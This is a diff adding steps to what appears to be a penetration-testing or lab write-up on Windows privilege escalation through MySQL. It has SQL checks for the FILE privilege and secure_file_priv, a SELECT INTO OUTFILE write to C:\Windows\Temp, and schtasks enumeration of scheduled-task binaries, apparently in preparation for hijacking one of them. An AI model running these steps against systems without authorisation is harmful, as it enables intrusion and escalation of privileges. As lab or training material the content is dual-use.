@@ -14,8 +14,6 @@ used chisel to port forward , then accessed it on browser now i have the mysql a
 
 ### 1.1 Check FILE Privilege
 
-sql
-
 ```sql
 -- Check if current MySQL user has FILE privilege
 SELECT * FROM information_schema.USER_PRIVILEGES 
@@ -25,3 +23,48 @@ WHERE PRIVILEGE_TYPE = 'FILE';
 SELECT user();
 SELECT current_user();
 ```
+
+### 1.2 Check secure_file_priv (Critical)
+
+sql
+
+```sql
+SHOW VARIABLES LIKE 'secure_file_priv';
+```
+
+|Result|Meaning|
+|---|---|
+|Empty string `""`|No restriction — write anywhere ✅|
+|`NULL`|File operations disabled ❌|
+|`/some/path/`|Can only write to that path|
+
+### 1.3 Verify Write Access with Test File
+
+sql
+
+```sql
+-- Write a test file to confirm write works
+SELECT 'test' INTO OUTFILE 'C:\\Windows\\Temp\\test.txt';
+```
+
+Then on target:
+
+cmd
+
+```cmd
+type C:\Windows\Temp\test.txt
+-- output: test ✅
+```
+
+---
+
+## Phase 2 — Enumerate Scheduled Tasks
+
+### 2.1 List All Tasks and Their Binaries
+
+cmd
+
+```cmd
+schtasks /query /fo LIST /v | findstr /i "TaskName\|Task To Run\|Run As User\|Next Run"
+```
+
